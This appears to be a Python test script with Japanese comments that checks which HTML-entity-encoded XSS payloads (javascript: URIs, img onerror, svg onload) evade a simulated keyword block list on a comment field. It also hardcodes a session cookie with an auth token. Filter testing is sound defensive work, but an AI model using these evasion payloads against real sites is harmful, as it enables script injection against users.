import urllib.request
import urllib.parse

def test_encoded_bypass():
    cookie = "user_id=6; username=test1001; is_admin=False; role=user; auth_token=eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogInRlc3QxMDAxIiwgImlzX2FkbWluIjogZmFsc2UsICJyb2xlIjogInVzZXIifQ==; session=.eJxFjUEKwyAURK9SZu3CtJgEr9IEsfqlgkkhX1chd6-fLrp5M7xZzAmXiuc3MezzxK32ALcQiBkKS3to_xKmIAyzcOxmTikuzdy9FmMm4UT_bhLWa1XI7Hzc8g6bfGFSOD6FYNGYjn4g4XKEHX9995uslbgOWg-4vkqQM0Y.aNyEWw.WU_oe6wU6uh8fVnQR6l_FCRWEgA"
    
    # 回避テスト用ペイロード
    bypass_payloads = [
        # 元のペイロード（検出される）
        "j&#x61;vas&#x63;ript:\u0061lert(1)",
        
        # 完全エンコード（回避可能）
        "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;",
        
        # img onerror（回避可能）
        "<img src=x on&#101;rror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
        
        # SVG onload（回避可能）
        "<svg on&#108;o&#97;d=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
        
        # 正常なコメント（通るべき）
        "この商品は素晴らしいです！"
    ]
    
    print("=== エンコード回避テスト ===\n")
    
    for i, comment in enumerate(bypass_payloads, 1):
        print(f"[テスト {i}]")
        print(f"ペイロード: {comment}")
        
        # 簡易フィルターシミュレーション
        blocked_keywords = [
            'alert', 'script', 'prompt', 'confirm', 
            'console.log', '"', 'javascript:', 'eval',
            'document.', 'window.', 'onerror', 'onload',
            'onclick', 'onmouseover', '<script', '</script>'
        ]
        
        comment_lower = comment.lower()
        will_block = any(keyword in comment_lower for keyword in blocked_keywords)
        
        if will_block:
            print("予測: 🔴 ブロックされる")
        else:
            print("予測: 🟢 フィルター回避")
            
        # 実際のHTMLデコード結果
        import html
        decoded = html.unescape(comment)
        if decoded != comment:
            print(f"デコード後: {decoded}")
            
        print("-" * 60)

if __name__ == "__main__":
    test_encoded_bypass()